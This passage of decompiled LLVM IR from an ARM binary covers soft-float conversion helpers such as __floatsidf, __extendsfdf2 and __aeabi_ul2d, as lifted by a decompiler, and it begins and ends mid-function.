  %v2_1a374 = add nsw i32 %v1_1a374, -8
  br label %.thread4

.thread4:                                         ; preds = %bb41, %.thread3, %bb42
  %v1_1a380 = phi i32 [ %v1_1a374, %.thread3 ], [ %v1_1a374, %bb41 ], [ %v2_1a374, %bb42 ]
  %v1_1a37c = phi i32 [ %v1_1a370, %.thread3 ], [ %v4_1a370, %bb41 ], [ %v4_1a370, %bb42 ]
  %v2_1a378 = icmp ugt i32 %v1_1a37c, 15
  br i1 %v2_1a378, label %bb43, label %.thread5

bb43:                                             ; preds = %.thread4
  %v2_1a37c = and i32 %v1_1a37c, 8
  %v3_1a37c = icmp eq i32 %v2_1a37c, 0
  %v4_1a37c = udiv i32 %v1_1a37c, 16
  br i1 %v3_1a37c, label %.thread5, label %bb44

bb44:                                             ; preds = %bb43
  %v2_1a380 = add nsw i32 %v1_1a380, -4
  br label %.thread5

.thread5:                                         ; preds = %bb43, %.thread4, %bb44
  %v1_1a388 = phi i32 [ %v1_1a380, %.thread4 ], [ %v1_1a380, %bb43 ], [ %v2_1a380, %bb44 ]
  %v1_1a390 = phi i32 [ %v1_1a37c, %.thread4 ], [ %v4_1a37c, %bb43 ], [ %v4_1a37c, %bb44 ]
  %v2_1a384 = icmp ugt i32 %v1_1a390, 3
  br i1 %v2_1a384, label %bb45, label %.thread6

bb45:                                             ; preds = %.thread5
  %v2_1a388 = add i32 %v1_1a388, -2
  br label %bb46

.thread6:                                         ; preds = %.thread5
  %v5_1a38c = udiv i32 %v1_1a390, 2
  %v6_1a38c = sub i32 %v1_1a388, %v5_1a38c
  br label %bb46

bb46:                                             ; preds = %bb45, %.thread6
  %v0_1a390 = phi i32 [ %v6_1a38c, %.thread6 ], [ %v2_1a388, %bb45 ]
  %v4_1a390 = udiv i32 %v1_1a390, 8
  %v5_1a390 = sub i32 %v0_1a390, %v4_1a390
  %v2_1a394 = add i32 %v5_1a390, -32
  %v4_1a394 = sub i32 31, %v5_1a390
  %v5_1a394 = and i32 %v4_1a394, %v5_1a390
  %v8_1a394 = icmp eq i32 %v5_1a390, 32
  %v6_1a398 = icmp slt i32 %v5_1a390, 32
  br i1 %v6_1a398, label %dec_label_pc_1a39c, label %dec_label_pc_1a3bc

dec_label_pc_1a39c:                               ; preds = %bb46
  %v2_1a39c = add i32 %v5_1a390, -20
  %v7_1a3a0 = icmp sgt i32 %v2_1a394, -12
  br i1 %v7_1a3a0, label %dec_label_pc_1a3a4, label %dec_label_pc_1a3b8

dec_label_pc_1a3a4:                               ; preds = %dec_label_pc_1a39c
  %v1_1a3a8 = sub i32 32, %v5_1a390
  %v6_1a3ac = shl i32 %v0_1a3b0, %v5_1a390
  store i32 %v6_1a3ac, i32* @r0, align 4
  %v6_1a3b0 = lshr i32 %v0_1a3b0, %v1_1a3a8
  store i32 %v6_1a3b0, i32* %r1.global-to-local, align 4
  br label %.thread31

dec_label_pc_1a3b8:                               ; preds = %dec_label_pc_1a39c
  %v8_1a39c = icmp eq i32 %v2_1a39c, 0
  %v4_1a39c = add i32 %v5_1a390, 2147483616
  %v5_1a39c = and i32 %v2_1a39c, %v4_1a39c
  br label %dec_label_pc_1a3bc

dec_label_pc_1a3bc:                               ; preds = %bb46, %dec_label_pc_1a3b8
  %v1_1a3c8.in = phi i32 [ %v2_1a394, %bb46 ], [ %v2_1a39c, %dec_label_pc_1a3b8 ]
  %v6_1a3c8 = phi i32 [ %v2_1a394, %bb46 ], [ %v5_1a390, %dec_label_pc_1a3b8 ]
  %v2_1a3c8.in = phi i32 [ %v5_1a394, %bb46 ], [ %v5_1a39c, %dec_label_pc_1a3b8 ]
  %v0_1a3c8 = phi i1 [ %v8_1a394, %bb46 ], [ %v8_1a39c, %dec_label_pc_1a3b8 ]
  %v1_1a3c8 = icmp slt i32 %v1_1a3c8.in, 0
  %v2_1a3c8 = icmp slt i32 %v2_1a3c8.in, 0
  %v3_1a3bc = xor i1 %v2_1a3c8, %v1_1a3c8
  %v4_1a3bc = or i1 %v0_1a3c8, %v3_1a3bc
  br i1 %v4_1a3bc, label %bb47, label %bb48

bb47:                                             ; preds = %dec_label_pc_1a3bc
  %v6_1a3bc = sub i32 32, %v6_1a3c8
  store i32 %v6_1a3bc, i32* @ip, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_1a3bc, %bb47
  %v6_1a3c0 = shl i32 %v0_1a3b0, %v6_1a3c8
  store i32 %v6_1a3c0, i32* %r1.global-to-local, align 4
  br i1 %v4_1a3bc, label %bb49, label %.thread31

bb49:                                             ; preds = %bb48
  %v6_1a3c4 = load i32, i32* @r0, align 4
  %v7_1a3c4 = load i32, i32* @ip, align 4
  %v12_1a3c4 = lshr i32 %v6_1a3c4, %v7_1a3c4
  %v13_1a3c4 = or i32 %v12_1a3c4, %v6_1a3c0
  store i32 %v13_1a3c4, i32* %r1.global-to-local, align 4
  %v11_1a3c8 = shl i32 %v6_1a3c4, %v6_1a3c8
  store i32 %v11_1a3c8, i32* @r0, align 4
  br label %.thread31

.thread31:                                        ; preds = %bb48, %dec_label_pc_1a3a4, %bb49
  %v6_1a3d0 = phi i32 [ %v6_1a3b0, %dec_label_pc_1a3a4 ], [ %v13_1a3c4, %bb49 ], [ %v6_1a3c0, %bb48 ]
  %v0_1a3cc = load i32, i32* @r4, align 4
  %v2_1a3cc = sub i32 %v0_1a3cc, %v5_1a390
  store i32 %v2_1a3cc, i32* %r4.global-to-local, align 4
  %v4_1a3cc = xor i32 %v0_1a3cc, %v5_1a390
  %v5_1a3cc = xor i32 %v2_1a3cc, %v0_1a3cc
  %v6_1a3cc = and i32 %v5_1a3cc, %v4_1a3cc
  %v7_1a3cc = icmp slt i32 %v6_1a3cc, 0
  %v8_1a3cc = icmp slt i32 %v2_1a3cc, 0
  %v5_1a3d0 = icmp slt i32 %v0_1a3cc, %v5_1a390
  br i1 %v5_1a3d0, label %.thread8, label %bb50

bb50:                                             ; preds = %.thread31
  %v10_1a3d0 = mul i32 %v2_1a3cc, 1048576
  %v11_1a3d0 = add i32 %v10_1a3d0, %v6_1a3d0
  %v7_1a3d4 = load i32, i32* @r5, align 4
  %v8_1a3d4 = or i32 %v7_1a3d4, %v11_1a3d0
  store i32 %v8_1a3d4, i32* %r1.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %.thread31, %bb50
  %v3_1a3dc = xor i1 %v8_1a3cc, %v7_1a3cc
  %v4_1a3dc = xor i1 %v3_1a3dc, true
  call void @__pseudo_cond_branch(i1 %v4_1a3dc, i32 %tmp33)
  %v0_1a3e0 = load i32, i32* %r4.global-to-local, align 4
  %v2_1a3e4 = sub i32 -32, %v0_1a3e0
  store i32 %v2_1a3e4, i32* %r4.global-to-local, align 4
  %v6_1a3e8 = icmp sgt i32 %v0_1a3e0, -32
  br i1 %v6_1a3e8, label %dec_label_pc_1a3ec, label %dec_label_pc_1a42c

dec_label_pc_1a3ec:                               ; preds = %.thread8
  %v1_1a3ec = add i32 %v2_1a3e4, 12
  store i32 %v1_1a3ec, i32* %r4.global-to-local, align 4
  %v8_1a3f0 = icmp sgt i32 %v1_1a3ec, 0
  br i1 %v8_1a3f0, label %dec_label_pc_1a410, label %dec_label_pc_1a3f4

dec_label_pc_1a3f4:                               ; preds = %dec_label_pc_1a3ec
  %v1_1a3f4 = add i32 %v2_1a3e4, 32
  %v1_1a3f8 = sub i32 0, %v2_1a3e4
  %v0_1a3fc = load i32, i32* @r0, align 4
  %v6_1a3fc = lshr i32 %v0_1a3fc, %v1_1a3f4
  %v1_1a400 = load i32, i32* %r1.global-to-local, align 4
  %v7_1a400 = shl i32 %v1_1a400, %v1_1a3f8
  %v8_1a400 = or i32 %v7_1a400, %v6_1a3fc
  %v0_1a404 = load i32, i32* @r5, align 4
  %v7_1a404 = lshr i32 %v1_1a400, %v1_1a3f4
  %v8_1a404 = or i32 %v0_1a404, %v7_1a404
  store i32 %v8_1a404, i32* %r1.global-to-local, align 4
  %v2_1a408 = load i32, i32* %stack_var_12, align 4
  store i32 %v2_1a408, i32* %r4.global-to-local, align 4
  ret i32 %v8_1a400

dec_label_pc_1a410:                               ; preds = %dec_label_pc_1a3ec
  %v1_1a410 = sub i32 0, %v2_1a3e4
  %v1_1a414 = add i32 %v2_1a3e4, 32
  %v0_1a418 = load i32, i32* @r0, align 4
  %v6_1a418 = lshr i32 %v0_1a418, %v1_1a414
  %v1_1a41c = load i32, i32* %r1.global-to-local, align 4
  %v7_1a41c = shl i32 %v1_1a41c, %v1_1a410
  %v8_1a41c = or i32 %v7_1a41c, %v6_1a418
  %v0_1a420 = load i32, i32* @r5, align 4
  store i32 %v0_1a420, i32* %r1.global-to-local, align 4
  %v2_1a424 = load i32, i32* %stack_var_12, align 4
  store i32 %v2_1a424, i32* %r4.global-to-local, align 4
  ret i32 %v8_1a41c

dec_label_pc_1a42c:                               ; preds = %.thread8
  %v0_1a42c = load i32, i32* %r1.global-to-local, align 4
  %v6_1a42c = lshr i32 %v0_1a42c, %v2_1a3e4
  %v0_1a430 = load i32, i32* @r5, align 4
  store i32 %v0_1a430, i32* %r1.global-to-local, align 4
  %v2_1a434 = load i32, i32* %stack_var_12, align 4
  store i32 %v2_1a434, i32* %r4.global-to-local, align 4
  ret i32 %v6_1a42c

; uselistorder directives
  uselistorder i32 %v2_1a3e4, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v2_1a3cc, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1a3cc, { 2, 0, 1, 3 }
  uselistorder i32 %v6_1a3c0, { 1, 0, 2 }
  uselistorder i32 %v2_1a394, { 1, 0, 2 }
  uselistorder i32 %v5_1a390, { 6, 0, 5, 7, 3, 8, 2, 4, 9, 10, 1, 12, 11 }
  uselistorder i32 %v4_1a37c, { 1, 0 }
  uselistorder i32 %v1_1a37c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1a370, { 1, 0 }
  uselistorder i32 %v1_1a370, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1a364, { 1, 0 }
  uselistorder i32 %v0_1a3b0, { 3, 1, 2, 4, 0, 5, 6 }
  uselistorder i32* %r1.global-to-local, { 0, 8, 1, 6, 2, 7, 3, 4, 5, 9, 10 }
  uselistorder i32 -12, { 3, 1, 2, 4, 16, 17, 5, 19, 20, 6, 21, 22, 18, 15, 14, 13, 12, 11, 23, 24, 25, 26, 10, 7, 9, 8, 27, 28, 29, 0 }
  uselistorder i32 -20, { 0, 2, 1 }
  uselistorder i32 -2, { 9, 10, 11, 2, 4, 5, 3, 12, 13, 14, 0, 6, 8, 7, 15, 21, 20, 22, 23, 24, 17, 16, 19, 18, 1 }
  uselistorder i32 -4, { 10, 0, 1, 53, 11, 49, 12, 20, 73, 74, 75, 6, 21, 22, 23, 76, 77, 78, 7, 24, 25, 26, 79, 80, 81, 8, 27, 28, 82, 19, 18, 83, 84, 85, 17, 16, 15, 14, 29, 30, 31, 32, 33, 5, 34, 3, 35, 4, 86, 13, 36, 45, 46, 47, 48, 37, 38, 61, 62, 63, 9, 64, 65, 66, 39, 60, 2, 40, 54, 55, 56, 57, 58, 59, 67, 68, 69, 70, 71, 72, 41, 50, 51, 52, 42, 43, 44 }
  uselistorder i32 15, { 8, 9, 3, 15, 10, 11, 12, 13, 0, 16, 1, 18, 17, 2, 14, 4, 5, 6, 7 }
  uselistorder i32 -8, { 11, 12, 1, 40, 19, 20, 21, 22, 23, 24, 18, 17, 10, 16, 15, 14, 13, 25, 26, 27, 28, 29, 9, 44, 45, 30, 31, 32, 33, 34, 43, 46, 35, 47, 39, 36, 37, 38, 2, 41, 42, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 128, { 13, 14, 8, 9, 6, 7, 10, 21, 20, 0, 1, 2, 11, 17, 18, 3, 4, 12, 19, 5, 16, 22, 15 }
  uselistorder i32 255, { 8, 9, 5, 12, 13, 4, 6, 7, 11, 0, 1, 2, 3, 14, 10 }
  uselistorder i32 -16, { 2, 7, 8, 9, 10, 11, 12, 13, 14, 15, 6, 5, 4, 1, 16, 17, 18, 19, 20, 21, 3, 0, 22 }
  uselistorder i32 65536, { 3, 4, 5, 0, 6, 7, 8, 9, 11, 10, 16, 12, 17, 13, 18, 14, 19, 15, 20, 21, 22, 26, 23, 27, 24, 28, 25, 29, 31, 30, 32, 81, 34, 33, 80, 78, 36, 35, 38, 37, 82, 39, 40, 41, 1, 2, 42, 43, 44, 45, 79, 46, 48, 47, 49, 51, 50, 52, 53, 54, 55, 56, 58, 57, 59, 62, 61, 60, 63, 64, 65, 68, 67, 66, 69, 71, 72, 70, 73, 75, 76, 74, 77 }
  uselistorder i32 32768, { 3, 4, 2, 0, 1, 6, 5 }
  uselistorder i32 65535, { 3, 4, 1, 2, 5, 0 }
  uselistorder i32 52, { 1, 17, 3, 20, 12, 13, 4, 18, 19, 24, 25, 2, 26, 0, 27, 28, 5, 6, 7, 9, 8, 10, 15, 22, 16, 14, 23, 11, 21 }
  uselistorder i32 20, { 5, 41, 42, 2, 8, 47, 0, 30, 43, 44, 16, 17, 18, 19, 40, 51, 9, 52, 53, 3, 54, 48, 10, 31, 32, 37, 38, 39, 20, 11, 21, 22, 1, 55, 6, 12, 56, 45, 46, 4, 7, 33, 34, 35, 36, 23, 49, 24, 25, 26, 27, 28, 29, 15, 13, 50, 14 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread31, { 2, 0, 1 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_1a3bc, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %.thread5, { 2, 0, 1 }
  uselistorder label %.thread4, { 2, 0, 1 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_1a43c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
dec_label_pc_1a43c:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_1a43c = load i32, i32* @r4, align 4
  %v2_1a43c = icmp eq i32 %v0_1a43c, 0
  %v1_1a440 = xor i32 %arg3, 1048576
  store i32 %v1_1a440, i32* @r3, align 4
  br i1 %v2_1a43c, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_1a43c
  %v1_1a444 = load i32, i32* @r1, align 4
  %v2_1a444 = xor i32 %v1_1a444, 1048576
  store i32 %v2_1a444, i32* @r1, align 4
  store i32 1, i32* @r4, align 4
  br label %bb

.thread1:                                         ; preds = %dec_label_pc_1a43c
  %v1_1a44c = load i32, i32* @r5, align 4
  %v2_1a44c = add i32 %v1_1a44c, -1
  store i32 %v2_1a44c, i32* @r5, align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread1
  %v0_1a450 = call i32 @function_1a294()
  store i32 %v0_1a450, i32* %r0.global-to-local, align 4
  %v0_1a454 = load i32, i32* @r4, align 4
  %v0_1a454.off = add i32 %v0_1a454, 4194303
  %tmp = icmp ult i32 %v0_1a454.off, 2097152
  %v1_1a4e4 = load i32, i32* @r5, align 4
  %v1_1a4e4.off = add i32 %v1_1a4e4, 4194303
  %tmp44 = icmp ult i32 %v1_1a4e4.off, 2097152
  br i1 %tmp, label %.thread11, label %bb30

bb30:                                             ; preds = %bb
  br i1 %tmp44, label %bb37, label %dec_label_pc_1a460

dec_label_pc_1a460:                               ; preds = %bb30
  %v4_1a460 = icmp eq i32 %v1_1a4e4, %v0_1a454
  br i1 %v4_1a460, label %bb31, label %dec_label_pc_1a46c

bb31:                                             ; preds = %dec_label_pc_1a460
  %v2_1a464 = load i32, i32* @r2, align 4
  %v5_1a464 = icmp eq i32 %v2_1a464, %v0_1a450
  br i1 %v5_1a464, label %dec_label_pc_1a480, label %dec_label_pc_1a46c

dec_label_pc_1a46c:                               ; preds = %dec_label_pc_1a460, %bb31
  %v2_1a46c = or i32 %v0_1a454, %v0_1a450
  %v4_1a46c = icmp eq i32 %v2_1a46c, 0
  br i1 %v4_1a46c, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_1a46c
  %v1_1a474 = load i32, i32* @r2, align 4
  store i32 %v1_1a474, i32* %r0.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_1a46c, %bb32
  %v1_1a47c = phi i32 [ %v0_1a450, %dec_label_pc_1a46c ], [ %v1_1a474, %bb32 ]
  ret i32 %v1_1a47c

dec_label_pc_1a480:                               ; preds = %bb31
  %v0_1a480 = load i32, i32* @r1, align 4
  %v1_1a480 = load i32, i32* @r3, align 4
  %v4_1a480 = icmp eq i32 %v1_1a480, %v0_1a480
  br i1 %v4_1a480, label %dec_label_pc_1a480..thread8_crit_edge, label %bb33

dec_label_pc_1a480..thread8_crit_edge:            ; preds = %dec_label_pc_1a480
  %v0_1a490.pre = load i32, i32* @lr, align 4
  br label %.thread8

bb33:                                             ; preds = %dec_label_pc_1a480
  store i32 0, i32* @r1, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* @r4, align 4
  store i32 %arg6, i32* @lr, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1a480..thread8_crit_edge, %bb33
  %v0_1a490 = phi i32 [ %v0_1a490.pre, %dec_label_pc_1a480..thread8_crit_edge ], [ %arg6, %bb33 ]
  %v2_1a490 = xor i1 %v4_1a480, true
  call void @__pseudo_cond_branch(i1 %v2_1a490, i32 %v0_1a490)
  %v0_1a494 = load i32, i32* @r4, align 4
  %tmp45 = icmp ult i32 %v0_1a494, 2097152
  br i1 %tmp45, label %dec_label_pc_1a49c, label %dec_label_pc_1a4b0

dec_label_pc_1a49c:                               ; preds = %.thread8
  %v0_1a49c = load i32, i32* %r0.global-to-local, align 4
  %v1_1a49c = icmp slt i32 %v0_1a49c, 0
  %v2_1a49c = mul i32 %v0_1a49c, 2
  store i32 %v2_1a49c, i32* %r0.global-to-local, align 4
  %v0_1a4a0 = load i32, i32* @r1, align 4
  %v3_1a4a0 = mul i32 %v0_1a4a0, 2
  %v4_1a4a0 = zext i1 %v1_1a49c to i32
  %v5_1a4a0 = or i32 %v3_1a4a0, %v4_1a4a0
  %v9_1a4a0 = icmp ule i32 %v5_1a4a0, %v0_1a4a0
  %v10_1a4a0 = icmp ult i32 %v3_1a4a0, %v0_1a4a0
  %v11_1a4a0 = select i1 %v1_1a49c, i1 %v9_1a4a0, i1 %v10_1a4a0
  br i1 %v11_1a4a0, label %bb34, label %bb35

bb34:                                             ; preds = %dec_label_pc_1a49c
  br label %bb35

bb35:                                             ; preds = %dec_label_pc_1a49c, %bb34
  ret i32 %v2_1a49c

dec_label_pc_1a4b0:                               ; preds = %.thread8
  %v2_1a4b0 = icmp ugt i32 %v0_1a494, -4194305
  br i1 %v2_1a4b0, label %dec_label_pc_1a4b0..thread9_crit_edge, label %bb36

dec_label_pc_1a4b0..thread9_crit_edge:            ; preds = %dec_label_pc_1a4b0
  %v0_1a4bc.pre = load i32, i32* @lr, align 4
  br label %.thread9

bb36:                                             ; preds = %dec_label_pc_1a4b0
  %v1_1a4b4 = load i32, i32* @r1, align 4
  %v2_1a4b4 = add i32 %v1_1a4b4, 1048576
  store i32 %v2_1a4b4, i32* @r1, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_1a4b0..thread9_crit_edge, %bb36
  %v0_1a4bc = phi i32 [ %v0_1a4bc.pre, %dec_label_pc_1a4b0..thread9_crit_edge ], [ %arg9, %bb36 ]
  %v2_1a4bc = xor i1 %v2_1a4b0, true
  call void @__pseudo_cond_branch(i1 %v2_1a4bc, i32 %v0_1a4bc)
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

.thread11:                                        ; preds = %bb
  %v1_1a4f0.pre = load i32, i32* @r1, align 4
  br i1 %tmp44, label %.thread13, label %.thread14

.thread14:                                        ; preds = %.thread11
  store i32 %v1_1a4f0.pre, i32* @r3, align 4
  br label %bb38

bb37:                                             ; preds = %bb30
  %v1_1a4dc = load i32, i32* @r3, align 4
  %v1_1a4e0 = load i32, i32* @r2, align 4
  store i32 %v1_1a4e0, i32* %r0.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %bb37, %.thread14
  %v1_1a4f023 = phi i32 [ %v1_1a4f0.pre, %.thread14 ], [ %v1_1a4dc, %bb37 ]
  %v1_1a4ec = phi i32 [ %v0_1a450, %.thread14 ], [ %v1_1a4e0, %bb37 ]
  store i32 %v1_1a4ec, i32* @r2, align 4
  br label %.thread13

.thread13:                                        ; preds = %.thread11, %bb38
  %v1_1a4fc = phi i32 [ %v1_1a4f023, %bb38 ], [ %v1_1a4f0.pre, %.thread11 ]
  %v1_1a504 = phi i32 [ %v1_1a4ec, %bb38 ], [ %v0_1a450, %.thread11 ]
  %v4_1a4f0 = mul i32 %v1_1a4fc, 4096
  %v5_1a4f0 = or i32 %v4_1a4f0, %v1_1a504
  %v7_1a4f0 = icmp eq i32 %v5_1a4f0, 0
  br i1 %v7_1a4f0, label %bb39, label %.thread17

bb39:                                             ; preds = %.thread13
  %v1_1a4f4 = load i32, i32* @r2, align 4
  %v2_1a4f4 = load i32, i32* @r3, align 4
  %v5_1a4f4 = mul i32 %v2_1a4f4, 4096
  %v6_1a4f4 = or i32 %v5_1a4f4, %v1_1a4f4
  %v8_1a4f4 = icmp eq i32 %v6_1a4f4, 0
  br i1 %v8_1a4f4, label %bb40, label %.thread17

bb40:                                             ; preds = %bb39
  %v5_1a4f8 = icmp eq i32 %v2_1a4f4, %v1_1a4fc
  br i1 %v5_1a4f8, label %bb41, label %.thread17

.thread17:                                        ; preds = %.thread13, %bb39, %bb40
  br label %bb41

bb41:                                             ; preds = %bb40, %.thread17
  ret i32 %v1_1a504

; uselistorder directives
  uselistorder i32 %v1_1a4f0.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1a4a0, { 1, 2, 0 }
  uselistorder i32 %v2_1a49c, { 1, 0 }
  uselistorder i1 %v1_1a49c, { 1, 0 }
  uselistorder i32 %v0_1a494, { 1, 0 }
  uselistorder i1 %v4_1a480, { 1, 0 }
  uselistorder i32 %v0_1a454, { 2, 0, 1 }
  uselistorder i32 %v0_1a450, { 2, 3, 4, 1, 0, 5 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 5, 3, 4, 6 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %.thread17, { 2, 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %bb35, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %dec_label_pc_1a46c, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__aeabi_ui2d(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_1a508 = icmp eq i32 %arg1, 0
  br i1 %v2_1a508, label %bb, label %bb3

bb:                                               ; preds = %entry
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v0_1a510 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1a508, i32 %v0_1a510)
  store i32 1074, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* @r1, align 4
  %v0_1a528 = call i32 @function_1a348()
  ret i32 %v0_1a528

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__floatsidf(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_1a52c = icmp eq i32 %arg1, 0
  br i1 %v2_1a52c, label %bb, label %bb3

bb:                                               ; preds = %entry
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v0_1a534 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1a52c, i32 %v0_1a534)
  store i32 1074, i32* @r4, align 4
  %v1_1a544 = and i32 %arg1, -2147483648
  store i32 %v1_1a544, i32* @r5, align 4
  %v2_1a544 = icmp eq i32 %v1_1a544, 0
  br i1 %v2_1a544, label %bb5, label %bb4

bb4:                                              ; preds = %bb3
  %v2_1a548 = sub i32 0, %arg1
  store i32 %v2_1a548, i32* @r0, align 4
  br label %bb5

bb5:                                              ; preds = %bb3, %bb4
  store i32 0, i32* @r1, align 4
  %v0_1a550 = call i32 @function_1a348()
  ret i32 %v0_1a550

; uselistorder directives
  uselistorder label %bb5, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__extendsfdf2(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %v2_1a554 = mul i32 %arg1, 2
  store i32 %v2_1a554, i32* %r2.global-to-local, align 4
  %v4_1a554 = icmp eq i32 %v2_1a554, 0
  %v1_1a558 = and i32 %v2_1a554, 4
  %v2_1a558 = icmp ne i32 %v1_1a558, 0
  %v3_1a558 = sdiv i32 %v2_1a554, 8
  %v3_1a55c = zext i1 %v2_1a558 to i32
  %v6_1a55c = zext i32 %v3_1a558 to i64
  %v7_1a55c = sub nsw i32 33, %v3_1a558
  %v8_1a55c = zext i32 %v7_1a55c to i64
  %v9_1a55c = shl i64 %v6_1a55c, %v8_1a55c
  %v10_1a55c = sub nsw i32 32, %v3_1a558
  %v11_1a55c = shl i32 %v3_1a55c, %v10_1a55c
  %v12_1a55c = zext i32 %v11_1a55c to i64
  %v14_1a55c = or i64 %v12_1a55c, %v9_1a55c
  %v15_1a55c = trunc i64 %v14_1a55c to i32
  store i32 %v15_1a55c, i32* %r1.global-to-local, align 4
  %v3_1a560 = mul i32 %arg1, 536870912
  store i32 %v3_1a560, i32* @r0, align 4
  br i1 %v4_1a554, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v2_1a564 = and i32 %v2_1a554, -16777216
  store i32 %v2_1a564, i32* @r3, align 4
  %v4_1a564 = icmp eq i32 %v2_1a564, 0
  br i1 %v4_1a564, label %.thread1, label %bb7

bb7:                                              ; preds = %bb
  %v4_1a568 = icmp ugt i32 %v2_1a554, -16777217
  br i1 %v4_1a568, label %.thread1, label %bb8

bb8:                                              ; preds = %bb7
  %v2_1a56c = xor i32 %v15_1a55c, 939524096
  store i32 %v2_1a56c, i32* %r1.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb, %bb7, %bb8
  %v1_1a570 = phi i1 [ false, %bb ], [ false, %bb7 ], [ true, %bb8 ], [ false, %entry ]
  %v0_1a570 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_1a570, i32 %v0_1a570)
  %v0_1a574 = load i32, i32* %r2.global-to-local, align 4
  %v2_1a574 = icmp eq i32 %v0_1a574, 0
  br i1 %v2_1a574, label %bb10, label %bb9

bb9:                                              ; preds = %.thread1
  %v1_1a578 = load i32, i32* @r3, align 4
  %v4_1a578 = icmp eq i32 %v1_1a578, -16777216
  br label %bb10

bb10:                                             ; preds = %.thread1, %bb9
  %v1_1a57c = phi i1 [ true, %.thread1 ], [ %v4_1a578, %bb9 ]
  %v0_1a57c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_1a57c, i32 %v0_1a57c)
  store i32 896, i32* @r4, align 4
  %v0_1a588 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a588 = and i32 %v0_1a588, -2147483648
  store i32 %v1_1a588, i32* @r5, align 4
  %tmp = bitcast i32 %v0_1a588 to float
  %tmp11 = call float @fabsf(float %tmp)
  %v1_1a58c = bitcast float %tmp11 to i32
  store i32 %v1_1a58c, i32* @r1, align 4
  %v0_1a590 = call i32 @function_1a348()
  ret i32 %v0_1a590

; uselistorder directives
  uselistorder i32 %v3_1a558, { 1, 2, 0 }
  uselistorder i32 %v2_1a554, { 0, 4, 5, 3, 2, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 0, 2 }
  uselistorder i32 ()* @function_1a348, { 2, 1, 0 }
  uselistorder i32 -16777216, { 0, 2, 1 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %.thread1, { 3, 2, 1, 0 }
}

define i32 @__aeabi_ul2d(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_1a594 = or i32 %arg2, %arg1
  %v4_1a594 = icmp eq i32 %v2_1a594, 0
  %v0_1a598 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1a594, i32 %v0_1a598)
  store i32 0, i32* @r5, align 4
  %v0_1a5a4 = call i32 @function_1a5c4()
  ret i32 %v0_1a5a4
}

define i32 @__floatdidf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1a5a8 = or i32 %arg2, %arg1
  %v4_1a5a8 = icmp eq i32 %v2_1a5a8, 0
  %v0_1a5ac = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1a5a8, i32 %v0_1a5ac)
  %v1_1a5b8 = icmp sgt i32 %arg2, -1
  call void @__pseudo_cond_branch(i1 %v1_1a5b8, i32 ptrtoint (i32* @global_var_1a5c4.694 to i32))
  %v1_1a5bc = sub i32 0, %arg1
  ret i32 %v1_1a5bc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_1a5c4() local_unnamed_addr {
dec_label_pc_1a5c4:
  %r4.global-to-local = alloca i32, align 4
  store i32 1074, i32* %r4.global-to-local, align 4
  %v0_1a5cc = load i32, i32* @r1, align 4
  %tmp = icmp ult i32 %v0_1a5cc, 4194304
  call void @__pseudo_cond_branch(i1 %tmp, i32 ptrtoint (i32* @global_var_1a2e8.692 to i32))
